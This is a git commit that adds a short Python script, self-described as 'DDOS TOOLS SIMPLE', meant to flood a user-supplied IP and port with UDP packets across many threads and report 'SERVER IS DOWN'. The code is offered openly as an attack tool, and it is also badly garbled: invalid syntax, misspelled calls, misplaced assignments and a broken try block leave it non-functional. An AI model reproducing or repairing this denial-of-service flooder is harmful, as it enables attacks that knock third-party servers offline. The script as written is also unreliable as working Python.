a31b76b237e92617904f427830af1967b6d5ed92
XRyuuDdos <101028648+XRyuuDdos@users.noreply.github.com>
2022-03-07 21:05:31 +0700

    Add files via upload

---
+++ Ngentod.py
@@ -0,0 +1,32 @@
+import random
+import socket
+import threading
+import os,sys
+
+os,system("clear")
+print("DDOS TOOLS SIMPLE")
+
+x1 = str(input(Ip:))
+x2 = int(input(Port:))
+x3 = str(input(Ddos?:))
+x4 = int(input(Packet:))
+x5 = int(input(Threads:))
+
+def ddos():
+	data = random_urandom (1080)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
+		addr = (str(input(x1),int(input)x2))
+		s.connect =((x1,x2))
+		s.sendto = (ddos)
+		for x in range (choice)
+		print("DDOS ATTACK SERVER")
+	except:
+		print("SERVER IS DOWN")
+		
+for y in range (x5):
+	if choice = 'ddos'
+	th.threading.Tread(target = ddos)
+	th.start
+	
